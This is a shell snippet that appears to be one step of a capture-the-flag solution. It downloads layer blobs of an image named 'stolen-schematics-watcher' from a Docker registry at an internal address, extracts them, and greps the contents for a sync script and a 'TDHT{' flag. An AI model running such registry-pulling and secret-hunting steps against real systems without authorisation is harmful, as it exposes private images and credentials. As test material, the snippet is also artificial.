cat << 'EXTRACT_TEMPLATE'

# STEP 4 TEMPLATE (replace <DIGEST> with actual values from Step 2/3):

mkdir -p /tmp/watcher && cd /tmp/watcher

# For each layer digest from the manifest:
curl -s http://172.27.0.1:5000/v2/images/stolen-schematics-watcher/blobs/sha256:<DIGEST> -o layer1.tar.gz

# List contents first
tar -tzf layer1.tar.gz | grep -E "(sync|flag|TDHT)" | head -20

# Extract
mkdir -p extracted1
tar -xzf layer1.tar.gz -C extracted1 2>/dev/null || gunzip -c layer1.tar.gz | tar -x -C extracted1 2>/dev/null

# Find sync-loop.sh
find extracted1 -name "*sync*" -o -name "*flag*" 2>/dev/null
cat extracted1/opt/mc/scripts/sync-loop.sh 2>/dev/null

# Search for flag in all extracted files
grep -r "TDHT{" extracted1/ 2>/dev/null
